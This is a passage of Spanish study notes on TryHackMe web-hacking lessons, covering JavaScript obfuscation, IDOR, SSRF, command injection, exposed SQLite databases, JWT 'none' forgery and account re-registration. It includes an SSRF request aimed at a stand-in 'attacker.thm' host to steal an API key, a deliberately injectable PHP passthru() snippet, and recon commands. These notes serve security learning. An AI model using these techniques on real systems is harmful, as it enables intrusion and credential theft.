    "content": "En esta lección usaremos JS para crear un programa. JS es un lenguaje interpretado, es decir que se ejecuta en el navegador sin previa compilación. Aquí hay un ejemplo de un código en JS haciendo cosas muy básicas:\n\n```javascript\n// Hello, World! program\nconsole.log(\"Hello, World!\");\n\n// Variable and Data Type\nlet age = 25; // Number type\n\n// Control Flow Statement\nif (age >= 18) {\n    console.log(\"You are an adult.\");\n} else {\n    console.log(\"You are a minor.\");\n}\n\n// Function\nfunction greet(name) {\n    console.log(\"Hello, \" + name + \"!\");\n}\n\n// Calling the function\ngreet(\"Bob\");\n```\n\nJS es mayormente ejecutado del lado del cliente, lo que lo hace de fácil interacción e inspección con HTML desde el navegador. Usaremos la consola de google chrome.\n\n- Una vez en Chrome, pulsamos `Ctrl + Shift + I` o `click derecho > inspeccionar > consola`.\n- Vamos a hacer un código simple en JS que sume dos números y muestre el resultado:\n  ```javascript\nlet x = 5;\nlet y = 10;\nlet result = x + y;\nconsole.log(\"The result is: \" + result);\n```\n"
  },
  {
    "title": "7. Exploring Minified Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/7-exploring-minified-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/7. Exploring Minified Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Hemos entendido cómo JS funciona y cómo podemos leerlo, pero ¿qué pasa si no es leíble por humanos (ha sido minified)?\n\nLa minificación en JS es el proceso de comprimir archivos JS eliminando todos los caracteres inservibles, como espacios, comentarios, etc. Esto ayuda a reducir el tamaño del archivo y a mejorar el tiempo de carga de las páginas web. Hace el código más compacto y más difícil de leer para humanos.\n\nDe forma similar, la ofuscación es comúnmente usada para hacer JS más difícil de entender, renombrando variables y funciones a nombres sin sentido, incluso integrando código falso.\n\n---------------------\n<h2>Ejemplo Práctico</h2>\nCreamos un documento `hello.html` con el siguiente contenido:\n\n```html\n<!DOCTYPE html> \n<html lang=\"en\"> \n<head>     \n\t <title>Obfuscated JS Code</title> \n</head> \n<body>     \n\t<h1>Obfuscated JS Code</h1>     \n\t<script src=\"hello.js\"></script> \n</body> \n</html>\n```\n\nY un `hello.js` con el contenido:\n\n```js\nfunction hi() {\n\talert(\"Welcome to THM\");\n}\nhi();\n```\n\nAbre la página, haz click en `OK` y dirígete a `Inspeccionar`. Entonces navega hasta `Sources` y haz click en `hello.js`. Verás así que el código `.js` es visible y accesible.\n\n--------------------\n<h2>Ofuscación en Acción</h2>\nAhora, trataremos de minificarlo y ofuscarlo usando una herramienta [online](https://codebeautify.org/javascript-obfuscator). Copia y pega el código de `hello.js`. El resultado:\n\n```javascript\n(function(_0x114713,_0x2246f2){var _0x51a830=_0x33bf,_0x4ce60b=_0x114713();while(!![]){try\n{var _0x51ecd3=-parseInt(_0x51a830(0x88))/(-0x1bd3+-0x9a+0x2*0xe37)*(parseInt(_0x51a830(0x94))/\n(-0x15c1+-0x2*-0x3b3+0xe5d))+parseInt(_0x51a830(0x8d))/(0x961*0x1+0x2*0x4cb+0x4bd*-0x4)*\n(-parseInt(_0x51a830(0x97))/(-0x22b3+0x16e9+0x1*0xbce))+parseInt(_0x51a830(0x89))/\n(-0x631+0x20cd+0x8dd*-0x3)*(-parseInt(_0x51a830(0x95))/(-0x8fc+0x161+0x7a1))+-\nparseInt(_0x51a830(0x93))/(-0x1c38+0x193+0x1aac)*(parseInt(_0x51a830(0x8e))/\n(-0x1*-0x17a6+-0x167e+-0x3*0x60))+-parseInt(_0x51a830(0x91))/(-0x2*-0x1362+-0x4a8*0x5+-0xf73)*\n(parseInt(_0x51a830(0x8b))/(-0xb31*0x2+0x493*0x5+0x1*-0x73))+parseInt(_0x51a830(0x8f))/\n(-0x257a+-0x1752+0x3cd7)+parseInt(_0x51a830(0x90))/(-0x2244+-0x15f9+0x3849);if(_0x51ecd3\n===_0x2246f2)break;else _0x4ce60b['push'](_0x4ce60b['shift']());}catch(_0x38d15c)\n{_0x4ce60b['push'](_0x4ce60b['shift']());}}}(_0x11ed,-0x17d11*-0x1+0x2*0x2e27+0x100f*0x17));\nfunction hi(){var _0x48257e=_0x33bf,_0xab1127={'xMVHQ':function(_0x4eefa0,_0x4e5f74)\n{return _0x4eefa0(_0x4e5f74);},'FvtWc':_0x48257e(0x96)+_0x48257e(0x92)};_0xab1127[_0x48257e(0x8c)\n](alert,_0xab1127[_0x48257e(0x8a)]);}function _0x33bf(_0xb07259,_0x5949fe){var _0x3a386b\n=_0x11ed();return _0x33bf=function(_0x4348ee,_0x1bbf73){_0x4348ee=_0x4348ee-(0x11f7+-\n0x1*0x680+-0x3a5*0x3);var _0x423ccd=_0x3a386b[_0x4348ee];return _0x423ccd;},_0x33bf\n(_0xb07259,_0x5949fe);}function _0x11ed(){var _0x4c8fa8=['7407EbJESQ','\\x20THM',\n'2700698TTmqXC','10ILFtfZ','190500QONgph','Welcome\\x20to',\n'4492QOmepo','21623eEAyaP','65XMlsxw','FvtWc','2410qfnGAy','xMVHQ','321PfYXZg',\n'8XBaIAe','1946483GviJfa','15167592PYYhTN'];_0x11ed=function(){return _0x4c8fa8;};return _0x11ed();}hi();\n```\n\nPega ahora el nuevo código eliminando el antiguo de `hello.js`. Recarga la página. Debería de seguir funcionando exactamente igual.\n\n-------------------\n<h2>Des-Ofuscar un Código</h2>\nPodemos también desofuscar un código ofuscado con una herramienta [online](https://obf-io.deobfuscate.io/). Copia y pega el código ofuscado en ella y obtén el resultado desofuscado."
  },
  {
    "title": "4. Broken Access Control (IDOR Challenge)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/4-broken-access-control-idor-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/4. Broken Access Control (IDOR Challenge).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Referencia de Objeto Directo Insegura</h2>\n**IDOR** (Insecure Direct Object Reference), se refiere a la vulnerabilidad de access control donde puedes acceder a recursos que no deberías de ver. Esto ocurre cuando el programador expone una referencia de objeto directo, que es un identificador que se refiere a objetos específicos dentro del servidor. Por objeto podemos referirnos a un archivo, usuario, cuenta de banco o cualquier cosa.\n\nDigamos que estamos iniciando sesión en nuestra cuenta del banco, y después de autentificarnos correctamente, nos lleva a una URL como `https://bank.thm/account?id=111111`. En esa página podemos ver nuestros detalles sensibles.\n\nSi el sitio está configurado incorrectamente y alguien cambia el valor de id, ahora puede acceder a la cuenta de cada usuario.\n\nLa aplicación expone un objeto de referencia a través del parámetro `id` en la URL, que apunta a cuentas concretas. Ya que la aplicación no está comprobando si el usuario logueado es propietario de la cuenta referenciada, un atacante puede conseguir información sensible gracias a una vulnerabilidad IDOR."
  },
  {
    "title": "22. X. Server-Side Request Forgery (SSRF)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/22-x-server-side-request-forgery-ssrf/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/22. X. Server-Side Request Forgery (SSRF).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Este tipo de vulnerabilidad ocurre cuando un atacante convence a la aplicación web de mandar las peticiones en su representación a destinaciones arbitrarias mientras tiene el control sobre los contenidos de la petición en sí misma. Las vulnerabilidades SSRF comúnmente se ocasionan donde nuestra aplicación web utiliza servicios de terceros.\n\nPiensa, por ejemplo, en una aplicación web que usa una API externa para mandar notificaciones SMS a sus clientes. Por cada email, la app tiene que realizar una petición web al servidor proveedor de SMS para mandar el mensaje.Ya que los proveedores de mensajería cobran por el uso de mensajes, nos piden añadir una clave secreta, que te preasignan. Los servidores API de claves como tokens de autentificación te permiten que el proveedor sepa quién eres.\n\n![[Pasted image 20251013232653.png]]\n\nMirando el diagrama arriba mostrado es fácil ver dónde está la vulnerabilidad. La aplicación expone el parámetro `server` a los usuarios, que define el nombre del servidor proveedor de SMS. Si un atacante quisiese, simplemente cambiaría el valor del parámetro `server` para apuntar a una máquina que ellos controlen. Como parte del mensaje, recibirían la clave API, permitiéndoles usar los servicios SMS a tu costa. Para hacerlo, sólo tendría que hace la siguiente petición a tu sitio web:\n\n`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`\n\nEntonces simplemente capturarías el tráfico:\n\n```http\nuser@attackbox$ nc -lvp 80\nListening on 0.0.0.0 80\nConnection received on 10.10.1.236 43830\nGET /:8087/public-docs/123.pdf HTTP/1.1\nHost: 10.10.10.11\nUser-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0\nAccept: */*\n```\n\nAunque esto no parezca amenazante, SSRF se puede usar para:\n\n- Enumerar redes internas, incluyendo direcciones IPs y puertos.\n- Abusar relaciones de confianza entre servidores y ganar acceso a servicios de otra manera restringidos.\n- Interactuar con algunos servicios no-HTTP para conseguir ejecución remota de comandos (RCE).\n\n-----------------------\n<h2>Challenge</h2>\n1. Accedemos a la página web:\n   ![[Pasted image 20251013233709.png]]\n2. Después de investigar un poco encontramos \"admin area\":\n   ![[Pasted image 20251013233831.png]]\n3. Si nos fijamos, el servidor apunta a una dirección curiosa al descargar el CV:\n   ![[Pasted image 20251013234005.png]]\n4. Haciendo uso de lo que hemos aprendido, vamos a intentar SSRF:\n   ![[Pasted image 20251013234205.png]]\n5. Y voilà:\n   ![[Pasted image 20251013234231.png]]\n6. Para acceder a admin podemos modificar url de la descarga del CV y meter localhost con el endpoint `admin`:\n   ![[Pasted image 20251014000016.png]]\n7. La flag extra es:\n   ![[Pasted image 20251014000039.png]]\n\n>[!NOTE] The `#` symbol indicates a fragment identifier in a URL, which is often used by browsers to navigate to a specific part of a webpage. When you add `%23` (the URL-encoded version of `#`), it may be tricking the server into treating it as part of the URL, allowing the request to reach the `/admin` endpoint. Without it, the server might not recognize the path correctly or could return a different response.\n\n"
  },
  {
    "title": "10. III.I. Command Injection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/10-iii-i-command-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/10. III.I. Command Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Inyección de Comandos</h2>\nLa inyección de comandos ocurre cuando código del lado del servidor, como PHP, en una aplicación web, hace una llamada a una función que interactúa con la consola directamente. Una de estas vulnerabilidades permite al atacante ejecutar comandos en el sistema host.\n\nUna vez que esto pasa, ya puede empezar con la fase de enumeración y pivotar entre sistemas.\n\n------------------\n<h2>Ejemplo de Código</h2>\nConsideremos el siguiente escenario: MooCorp ha empezado a desarrollar una aplicación basada en web para arte ASCII de vacas con texto personalizable. Buscando maneras de implementar su app, han encontrado el comando `cowsay` de Linux, que hace justo eso. Así que en vez de programar una aplicación web entera, usan código simple para decirle a `cowsay` lo que tiene que hacer. Veamos el código que han desarrollado:\n\n```php\n<?php\n    if (isset($_GET[\"mooing\"])) {\n        $mooing = $_GET[\"mooing\"];\n        $cow = 'default';\n\n        if(isset($_GET[\"cow\"]))\n            $cow = $_GET[\"cow\"];\n        \n        passthru(\"perl /usr/bin/cowsay -f $cow $mooing\");\n    }\n?>\n```\n\nEn términos simples, este código hace lo siguiente:\n\n1. Comprueba si el parámetro \"mooing\" está definido. Si lo está, la variable `$mooing` recibe el valor pasado por el parámetro.\n2. Comprueba si el parámetro \"cow\" está definido. Si lo está, la variable `$cow` toma lo que le haya sido pasado.\n3. El programa ejecuta la función `passthru(\"perl /usr/bin/cowsay -f $cow $mooing);`. La función `passthru`, ejecuta un comando en la consola del sistema operativo. Podemos ver que el comando está concatenando las variables. Ya que podemos manipular esas variables, podemos inyectar comandos usando trucos.\n   \n   ![[Pasted image 20251009223354.png]]\n\n----------------------\n<h2>Explotar Inyección de Comandos</h2>\nAhora que sabemos cómo funciona la aplicación por dentro, nos aprovecharemos de una capacidad de bash llamada \"inline commands\".\n\nPara ejecutar comandos inline, sólo necesitamos en el siguiente formato `$(nuestro_comando)`. Si bash detecta un comando inline, lo ejecutará primero y usará el resultado con el comando principal, por ejemplo:\n\n![[Pasted image 20251009223744.png]]\n\nAsí que, volviendo a la app de cowsay, esto es lo que pasaría si inyectásemos comandos:\n\n![[Pasted image 20251009223818.png]]\n\nYa que la aplicación acepta cualquier input por nuestra parte, podemos inyectar comandos inline, que serán ejecutados y usados como parámetro para cowsay. Algunos comandos que puedes probar:\n\n- whoami\n- id\n- ifconfig / ip addr / ip a\n- uname -a\n- ps -ef\n\n------------------------\n<h2>Challenge</h2>\n\n1. ![[Pasted image 20251009224220.png]]\n2. ![[Pasted image 20251009224355.png]]\n3. ![[Pasted image 20251009224843.png]]\n4. ![[Pasted image 20251009225230.png]]\n5. ![[Pasted image 20251009225549.png]]\n"
  },
  {
    "title": "6. Cryptographic Failures (Supporting Material 1)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/6-cryptographic-failures-supporting-material-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/6. Cryptographic Failures (Supporting Material 1).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La forma más común de guardar una cantidad grande de información en un formato fácilmente accesible desde varios sitios es una base de datos. Los sitios web usualmente siguen SQL.\n\nEn un entorno de producción, es común ver bases de datos configuradas en servidores dedicados. Sin embargo, las bases de datos también se pueden guardar como archivos. A estas se les llama bases de datos \"flat-files\". Es mucho más sencillo que configurar una base de datos (aunque a gran escala también es mucho mas complicado de acceder a los datos).\n\nComo ya hemos dicho estos flat-files están guardados en directorios. Esto no sería un problema pero ¿qué pasa si la base de datos está guardada bajo el directorio root? Podríamos hacer queries a nuestra propia máquina, filtrando archivos potencialmente sensibles.\n\nVamos con el ejemplo, usaremos `sql3`. Supongamos que hemos sido capaces de descargarnos la base de datos:\n\n```bash\nuser@linux$ ls -l \n-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db\n                                                                                                                                                              \nuser@linux$ file example.db \nexample.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1\n```\n\nPodemos ver que hay un archivo SQLite. Para acceder a él usamos `sqlite3 <database_name>`.\n\n```bash\nuser@linux$ sqlite3 example.db                     \nSQLite version 3.39.2 2022-07-21 15:24:47\nEnter \".help\" for usage hints.\nsqlite> \n```\n\nAhora podemos usar las tablas usando el comando `.tables`:\n\n```sqlite\nsqlite> .tables\ncustomers\n```\n\nAhora podemos dumpear todo el contenido de las tablas. Aunque todavía no sabemos lo que significa cada columna hasta que miremos la información de la tabla, usemos pues, primero, `PRAGMA table_info(customers);` para ver la información de la tabla. Después usamos `SELECT * FROM customers;` para obtener la información guardada en la tabla.\n\n```sqlite\nqlite> PRAGMA table_info(customers);\n0|cudtID|INT|1||1\n1|custName|TEXT|1||0\n2|creditCard|TEXT|0||0\n3|password|TEXT|1||0\n\nsqlite> SELECT * FROM customers;\n0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99\n1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a\n2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19\n3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70\n4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679\n5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f\n```\n\nPodemos ver que hay cuatro columnas, `custID`, `custName`, `creditCard` y `password`. Podemos ver que además concuerda con los resultados."
  },
  {
    "title": "20. Data Integrity Failure",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/20-data-integrity-failure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/20. Data Integrity Failure.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Pensemos en cómo las aplicaciones web mantienen las sesiones. Usualmente, cuando un usuario inicia sesión en una aplicación, se le dará un token que se debe guardar en el navegador hasta que la sesión expire. Estos pueden ser asignados de varias formas, pero normalmente vienen dados vía cookies. Las **cookies** son pares llave-valor que el navegador guardará y que será utilizado en las comunicaciones con el servidor automática y repetidamente.\n\nSi creásemos una aplicación de email web, podríamos asociar a cada usuario logueado una cookie con su nombre de usuario. De esta manera, en peticiones siguientes se mandaría tu username en la cookie. Esto sería una idea terrible a nivel de ciberseguridad, porque si el usuario modifica el valor de la cookie, que se guarda en el navegador, podría obtener las cookies de sesión de otro usuario.\n\nUna solución a esto es usar algún mecanismo de integridad para garantizar que la cookie no haya sido modificada. Para esto podríamos usar un token que nos permita cumplir con los objetivos de criptografía y PoI (proof of integrity). Una de estas implementaciones es JWT (JSON Web Tokens).\n\nJWTs son tokens simples que te permiten guardar los pares llave-valor en un token que ofrece integridad como parte del token. La idea es que puedas generar tokens que puedas dar a tus usuarios con la certeza de que no serán capaces de alterar los valores de parejas y pasar el check de integridad. La estructura de un JWT consta de 3 partes:\n\n![[Pasted image 20251013172339.png]]\n\nEl header contiene metadatos indicando que es un JWT, y el algoritmo de firmado que se utiliza es HS256. El payload contiene el par llave-valor con la información que la aplicación web requiere al cliente guardar. La firma es similar a un hash, tomado para verificar la integridad del payload. Si cambias el payload, la firma no coincidirá y la aplicación web sabrá que se ha modificado el payload.\n\n>[!NOTE] Cada una de las partes del JWT es texto plano encodeado en base64.\n\n------------------------\n<h2>JWT y el Algoritmo None</h2>\nUna vulnerabilidad de fallo de integridad estuvo presente en algunas librerías que implementaban JWT hace un tiempo. Estas librerías permitieron a los atacantes bypassear la validación de firma cambiando las dos cosas siguientes en JWT:\n\n1. Modificar el header del token para que el header `alg` contuviese el valor `none`.\n2. Eliminar la parte de la firma.\n\nTomando como ejemplo el JWT que hemos visto antes, si quisiésemos cambiar el payload para que el nombre de usuario fuese \"admin\" y que no se hiciera la comprobación de integridad, tendríamos que decodear, modificar y volver a codificar el header y payload.\n\n![[Pasted image 20251013191114.png]]\n\n----------------------\n<h2>Challenge</h2>\n1. Entramos en la página dada:\n   ![[Pasted image 20251013222434.png]]\n2. Probando suerte con \"guest\" \"guest\" entramos a dicho usuario:\n   ![[Pasted image 20251013222538.png]]\n3. Si abrimos las dev tools podemos ver la cookie de sesión que se nos ha asignado:\n   ![[Pasted image 20251013222753.png]]\n4. Si decodeamos nuestro token:\n   ![[Pasted image 20251013223103.png]]\n5. Entonces sabemos que modificando la primera y segunda parte y borrando la última podemos acceder:\n   - Primero metemos el contenido decodeado en un archivo:\n     ![[Pasted image 20251013223552.png]]\n   - Ahora los modificamos:\n     ![[Pasted image 20251013223733.png]]\n     ![[Pasted image 20251013223814.png]]\n   - Por último extraemos los fragmentos codificados en base64:\n     ![[Pasted image 20251013224004.png]]\n6. Por último juntamos los trozos y lo sustituimos por nuestra cookie (hay que ponerle el punto al final):\n   ![[Pasted image 20251013224804.png]]\n7. Obtenemos la flag:\n   ![[Pasted image 20251013224834.png]]\n"
  },
  {
    "title": "5. II. Cryptographic Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/5-ii-cryptographic-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/5. II. Cryptographic Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Fallos Criptográficos</h2>\nUn fallo criptográfico se refiere a cualquier vulnerabilidad dada a raíz del mal uso o la falta de uso de un algoritmo criptográfico para proteger información sensible. Las aplicaciones web requieren de criptografía para ofrecer confidencialidad para sus usuarios en varios niveles.\n\nToma por ejemplo, una aplicación segura de email:\n\n- Al acceder a tu cuenta de email, quieres asegurarte de que la comunicación entre tú y el servidor sea cifrada. De esa manera, ojos curiosos no deseados no podrán entender nada. Cuando ciframos información en el tráfico de red lo llamamos **encrypting data in transit**.\n- Ya que tus emails están almacenados en algún servidor controlado por quien te ofrece el servicio, también es deseable que él no pueda leer los emails de sus clientes. Es por esto que también son encriptados en estático, lo que se conoce como **encrypting data at rest**.\n\nLoa fallos criptográficos normalmente acaban divulgando información sensible en las aplicaciones web. Normalmente es información referente a usuarios, como nombre, teléfono, etc. Aunque también podrían ser más técnicas, como usuarios o contraseñas.\n\nAprovecharse de estos fallos requiere el uso de técnicas como el MITM, aprovechando la poca o nula encriptación de los datos y pudiendo leerlos."
  },
  {
    "title": "17. Identification and Authetification Failures Practical",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/17-identification-and-authetification-failures-practical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/17. Identification and Authetification Failures Practical.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Para este ejemplo, miraremos un fallo lógico en el mecanismo de autentificación.\n\nMuchas veces, lo que ocurre es que los desarrolladores olvidan sanitizar el input dado por el usuario (username y password), lo que los hace vulnerables a ataques de tipo SQLI. De todas formas no centraremos en una vulnerabilidad que ocurre por un eror del programador: re-registro de un usuario existente.\n\nVeamos un ejemplo. Queremmos acceder a la cuenta `admin`, por lo que registramos un usuario \" admin\", ahora, al entrar, podremos ver el contenido de su cuenta.\n\n------------------\n<h2>Challenge</h2>\n1. Entramos a la página dada.\n   ![[140.png]]\n2. Intentamos registrar el usuario dado\n   ![[141.png]]\n3. Nos da error así que vamos a intentar otro nombre de usuario.\n   ![[142.png]]\n4. Probamos con  \" darren\" en vez de \"darren\".\n   ![[143.png]]\n5. Ahora si que ha funcionado.\n   ![[144.png]]\n6. Iniciamos sesión:\n   ![[145.png]]\n7. Obtenemos una flag:\n   ![[146.png]]\n8. Ahora pobamos a hacerlo con **arthur**:\n   ![[147.png]]\n9. Iniciamos sesion con arthur:\n   ![[148.png]]\n10. Obtenemos la segunda flag:\n    ![[149.png]]\n"
  },
  {
    "title": "18. VIII. Softwares and Data Integrity Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/18-viii-softwares-and-data-integrity-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/18. VIII. Softwares and Data Integrity Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>¿Qué es la integridad?</h2>\nAl hablar de integridad, nos referimos a la capacidad que tenemos de certificar que una pieza de información se mantiene sin tocar. Por ejemplo, si te estás descargando el último instalador de una aplicación, ¿cómo puedes estar seguro de que mientras la descargabas no fue modificada o daañada accidental o intencionadamente?\n\nPara contrarestar este problema, usualmente verás hashes mandados junto a los archivos para que puedas probar que es el mismo. Un hash es un número obtenido de aplicar un algotitmo concreto a un archivo. Normalmente encontraras MD5, SHA1, SHA256, etc.\n\nTomaremos WinSCP como ejemplo. Si vamos al su [repositorio](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/) de Sourceforge, veremos que para cada archivo hay algunos hashes publicados. Estos son pre-calculados por los creadores de WinSCP con el objetivo de que puedas saber si lo que has descargado se corresponde.\n\nSi descargamos el archivo ejecutable y lo hasheamos con los mismos algoritmos que aparecen publicados, veremos que efectivamente coinciden.\n\n-----------------------\n<h2>Fallos de Integridad de Información y Software</h2>\nEsta vulnerabilidad surge de código o infraestructura que usa software o información sin ningún tipo de comprobación de integridad. Como no está siendo comprobado, un atacante podría modificar código o software pasado a la aplicación con consecuencias inesperadas. Hay dos tipos de vulnerabilidades en esta categoría:\n\n- Fallos de Integridad de Software.\n- Fallos de Integridad de Información.\n\n"
  },
  {
    "title": "16. VII. Identification and Authentification Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/16-vii-identification-and-authentification-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/16. VII. Identification and Authentification Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La autentificación y manejo de sesiones constituye los componentes core de las aplicaciones web modernas. La autentificación permite a los usuarios ganar acceso a la apps verificando su identidad. La forma más común es usando un usuario y contraseña. El usuario las provee y el servidor verifica. Si es correcto, le da entonces al usuario una cookie de sesión. Tener una cookie de sesión hace que el servidor sepa quién está emitiendo las peticiones, por lo que es imprescindible.\n\nSi un atacante consigue encontrar fallos en el mecanismo de autentificación, puede ganar acceso a cuentas fuera de su dominio. Algunos de estos fallos incluyen:\n\n- **Ataques de fuerza bruta:** Si una aplicación web usa nombres de usuario y contraseñas, un atacante puede tratar de lanzar un ataque de fuerza bruta que le permita adivinar tanto uno como otro.\n- **Uso de credenciales débiles:** Las aplicaciones web deberían de tener políticas fuertes de configuración de contraseñas. Si se permite que la contraseña sea, por ejemplo, \"password1\" es mucho más fácil para un atacante adivinarla.\n- **Cookies de sesión débiles:** Las cookies de sesión son la manera que el servidor tiene de saber quién es alguien. Si esa cookie contiene valores predecibles los atacantes pueden configurar sus propias cookies y acceder a cuentas de usuarios.\n\nPuede haber varias formas de mitigación para mecanismos de autentificación rotos dependiendo del contexto:\n\n- Para evitar los ataques de adivinar contraseñas, asegúrate de que la aplicación requiere una contraseña fuerte.\n- Para evitar los ataques de fuerza bruta, asegúrate de que la aplicación fuerce un bloqueo después de cierto número de intentos fallidos.\n- Implementa factor de doble autentificación. Si un usuario tiene múltiples métodos de autentificación, como por ejemplo usuario y contraseña y un código en su móvil, es más difícil para el atacante ganar acceso."
  },
  {
    "title": "21. IX. Security Logging and Monitoring Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/21-ix-security-logging-and-monitoring-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/21. IX. Security Logging and Monitoring Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Cuando las aplicaciones web son configuradas, cada acción hecha por el usuario debería ser registrada. Logging es importante porque, en caso de incidente, la actividad del atacante puede ser rastreada. Una vez rastreado, su impacto y riesgo puede ser valorado. Sin logs, no habría manera de decir qué acciones ha realizado un atacante. Los impactos más significativos serían:\n\n- **Daño regulatorio:** Si un atacante gana acceso a información identificable de un usuario, los usuarios finales pueden sufrir de ello, y en consecuencia, los desarrolladores enfrentarse a multas o penas más severas.\n- **Riesgo de ataques futuros:** La presencia de un atacante puede pasar desapercibida sin logging. Esto podría permitirle ganar persistencia.\n\nLa información contenida en logs debería incluir lo siguiente:\n\n- Códigos de estado HTTP.\n- Time Stamps (momentos de tiempo).\n- Nombres de Usuario.\n- Endpoints API/page locations.\n- Direcciones IP.\n\nEstos logs tienen algo de información sensible por lo que se requiere guardarlos de forma segura y que múltiples copias estén guardadas en diferentes localizaciones.\n\nComo debes haberte dado cuenta, el logging es más importante después de que haya ocurrido un incidente o brecha. El escenario ideal es tener monitoreo para detectar cualquier actividad sospechosa con el objetivo de detener al atacante o reducir el impacto que pueda tener. Ejemplos comunes de actividad maliciosa incluyen:\n\n- Múltiples intentos de acceso no autorizado para una acción en particular (usualmente autentificación o acceso a recursos no autorizados).\n- Peticiones desde una IP anómala (aunque también puede dar falsos positivos).\n- Uso de herramientas automatizadas. Usando el valor de los headers User-Agent o la velocidad pueden ser indicativos de esto.\n- Payloads comunes, en aplicaciones web, es común para los atacantes usar los payloads conocidos.\n\nAunque sólo detectar actividad sospechosa no es útil, hay que tener un plan de actuación en concordancia a su nivel de impacto."
  },
  {
    "title": "3. I. Broken Access Control",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/3-i-broken-access-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/3. I. Broken Access Control.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
